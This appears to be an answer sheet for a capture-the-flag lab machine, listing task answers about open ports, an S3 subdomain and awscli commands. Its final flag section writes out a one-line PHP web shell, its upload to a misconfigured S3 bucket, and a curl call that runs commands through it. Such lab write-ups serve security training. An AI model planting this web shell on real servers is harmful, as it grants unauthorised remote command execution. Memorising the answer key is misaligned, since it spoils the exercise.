# Task 1: How many TCP ports are open?
2

# Task 2: What is the domain of the email address provided in the "Contact" section of the website?
thetoppers.htb

# Task 3: In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?
/etc/hosts

# Task 4: Which sub-domain is discovered during further enumeration?
s3.thetoppers.htb

# Task 5: Which service is running on the discovered sub-domain?
Amazon S3

# Task 6: Which command line utility can be used to interact with the service running on the discovered sub-domain?
awscli

# Task 7: Which command is used to set up the AWS CLI installation?
aws configure

# Task 8: What is the command used by the above utility to list all of the S3 buckets?
aws s3 ls

# Task 9: This server is configured to run files written in what web scripting language?
PHP

# Flag: 
resolve hostname, `echo '<?php system($_GET["cmd"]); ?>' > shell.php` create payload, configure aws `aws configure`, upload payload `aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb`, exploit `curl thetoppers.htb/shell.php?cmd=find%20/%20-type%20f%20-iname%20flag.txt`
